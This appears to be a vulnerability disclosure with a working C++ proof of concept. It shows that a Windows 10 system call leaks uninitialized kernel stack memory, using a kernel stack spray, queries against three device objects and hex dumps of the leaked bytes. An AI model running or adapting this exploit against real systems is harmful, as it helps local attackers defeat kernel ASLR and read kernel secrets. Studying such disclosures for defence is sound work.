@@ -1,0 +1,229 @@
+/*
+We have discovered that the nt!NtQueryVolumeInformationFile system call invoked against certain kernel objects discloses uninitialized kernel stack memory to user-mode clients. The vulnerability affects Windows 10 (32/64-bit); other versions were not tested. The paths that we have observed to trigger the leak in our test Windows 10 (1709) 64-bit VM are:
+
+--- cut ---
+  "\SystemRoot"
+  "\Device\LanmanRedirector"
+  "\Device\MailslotRedirector"
+--- cut ---
+
+There are two types of leaks that can occur, both in the output IO_STATUS_BLOCK structure [1]:
+
+--- cut ---
+  typedef struct _IO_STATUS_BLOCK {
+    union {
+      NTSTATUS Status;
+      PVOID    Pointer;
+    };
+    ULONG_PTR Information;
+  } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
+--- cut ---
+
+The first type is a 64-bit specific leak of 4 bytes of uninitialized kernel stack memory, corresponding to the upper 32 bits of the nested union, if the "Status" field is initialized, but "Pointer" is not. This is caused by the mismatch between sizeof(NTSTATUS)=4 and sizeof(PVOID)=8 on x64 platforms.
+
+The second type is when a completely uninitialized copy of IO_STATUS_BLOCK is passed down to the user-mode client. This results in a disclosure of 8 kernel stack bytes on x86 systems, and 16 bytes on x64 systems.
+
+Both types of leaks have been observed for various information classes tested against the three offending objects (SystemRoot, LanmanRedirector, MailslotRedirector). The problem is best illustrated by running the attached proof-of-concept program, which sprays the kernel stack with a 0x41 ('A') marker byte, invokes the nt!NtQueryVolumeInformationFile syscall with increasing information classes, and dumps the contents of the output IO_STATUS_BLOCK structures. The result of starting it in our test Windows 10 64-bit environment is as follows:
+
+--- cut ---
+  -------------- Testing \SystemRoot
+  Class: 1, Status: 0
+  00000000: 00 00 00 00 41 41 41 41 12 00 00 00 00 00 00 00 ....AAAA........
+  Class: 3, Status: 0
+  00000000: 00 00 00 00 41 41 41 41 18 00 00 00 00 00 00 00 ....AAAA........
+  Class: 4, Status: 0
+  00000000: 00 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00 ................
+  Class: 5, Status: 0
+  00000000: 00 00 00 00 41 41 41 41 14 00 00 00 00 00 00 00 ....AAAA........
+  Class: 6, Status: c0000022
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  Class: 7, Status: 0
+  00000000: 00 00 00 00 41 41 41 41 20 00 00 00 00 00 00 00 ....AAAA .......
+  Class: 8, Status: 0
+  00000000: 00 00 00 00 41 41 41 41 40 00 00 00 00 00 00 00 ....AAAA@.......
+  Class: 9, Status: c000000d
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  Class: a, Status: c000000d
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: b, Status: 0
+  00000000: 00 00 00 00 41 41 41 41 1c 00 00 00 00 00 00 00 ....AAAA........
+  Class: c, Status: 0
+  00000000: 00 00 00 00 41 41 41 41 04 00 00 00 00 00 00 00 ....AAAA........
+  Class: d, Status: c000000d
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  -------------- Testing \Device\LanmanRedirector
+  Class: 1, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 3, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 4, Status: 0
+  00000000: 00 00 00 00 41 41 41 41 08 00 00 00 00 00 00 00 ....AAAA........
+  Class: 5, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 6, Status: c0000022
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  Class: 7, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 8, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 9, Status: c000003b
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  Class: a, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: b, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: c, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: d, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  -------------- Testing \Device\MailslotRedirector
+  Class: 1, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 3, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 4, Status: 0
+  00000000: 00 00 00 00 41 41 41 41 08 00 00 00 00 00 00 00 ....AAAA........
+  Class: 5, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 6, Status: c0000022
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  Class: 7, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 8, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: 9, Status: c000003b
+  00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+  Class: a, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: b, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: c, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+  Class: d, Status: c0000002
+  00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
+--- cut ---
+
+It is clearly visible that a number of uninitialized bytes from the stack (indicated by the 0x41 value) are returned to the caller. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <ntstatus.h>
+
+#include <cstdio>
+
+#pragma comment(lib, "ntdll.lib")
+
+extern "C" {
+  NTSTATUS NTAPI NtMapUserPhysicalPages(
+    PVOID BaseAddress,
+    ULONG NumberOfPages,
+    PULONG PageFrameNumbers
+  );
+
+  NTSTATUS NTAPI NtQueryVolumeInformationFile(
+    _In_  HANDLE               FileHandle,
+    _Out_ PIO_STATUS_BLOCK     IoStatusBlock,
+    _Out_ PVOID                FsInformation,
+    _In_  ULONG                Length,
+    _In_  DWORD                FsInformationClass
+  );
+};
+
+VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
+  PBYTE Data = (PBYTE)Buffer;
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PVOID ptr, BYTE byte, ULONG size) {
+  PBYTE _ptr = (PBYTE)ptr;
+  for (ULONG i = 0; i < size; i++) {
+    _ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  static SIZE_T buffer[1024];
+
+  MyMemset(buffer, 'A', sizeof(buffer));
+  NtMapUserPhysicalPages(buffer, ARRAYSIZE(buffer), (PULONG)buffer);
+  MyMemset(buffer, 'B', sizeof(buffer));
+}
+
+VOID TestHandle(HANDLE hObject) {
+  static BYTE OutputBuffer[1024];
+
+  for (DWORD Class = 0; Class < 16; Class++) {
+    IO_STATUS_BLOCK iosb;
+    RtlZeroMemory(&iosb, sizeof(iosb));
+
+    SprayKernelStack();
+
+    NTSTATUS Status = NtQueryVolumeInformationFile(hObject, &iosb, OutputBuffer, sizeof(OutputBuffer), (FILE_INFORMATION_CLASS)Class);
+    if (Status == STATUS_INVALID_INFO_CLASS || Status == STATUS_INVALID_DEVICE_REQUEST) {
+      continue;
+    }
+
+    printf("Class: %x, Status: %x\n", Class, Status);
+    PrintHex(&iosb, sizeof(iosb));
+  }
+}
+
+VOID TestObject(PWCHAR Name) {
+  HANDLE hFile = NULL;
+  OBJECT_ATTRIBUTES attrs;
+  IO_STATUS_BLOCK iosb;
+
+  UNICODE_STRING UnicodeName;
+  RtlInitUnicodeString(&UnicodeName, Name);
+
+  InitializeObjectAttributes(&attrs, &UnicodeName, 0, NULL, NULL);
+
+  NTSTATUS Status = NtCreateFile(&hFile,
+                                 FILE_READ_ATTRIBUTES,
+                                 &attrs,
+                                 &iosb,
+                                 NULL,
+                                 FILE_ATTRIBUTE_NORMAL,
+                                 FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                                 FILE_OPEN,
+                                 0,
+                                 NULL,
+                                 0);
+
+  if (NT_SUCCESS(Status)) {
+    wprintf(L"-------------- Testing %s\n", Name);
+    TestHandle(hFile);
+    CloseHandle(hFile);
+  }
+}
+
+int main() {
+  TestObject(L"\\SystemRoot");
+  TestObject(L"\\Device\\LanmanRedirector");
+  TestObject(L"\\Device\\MailslotRedirector");
+
+  return 0;
+}
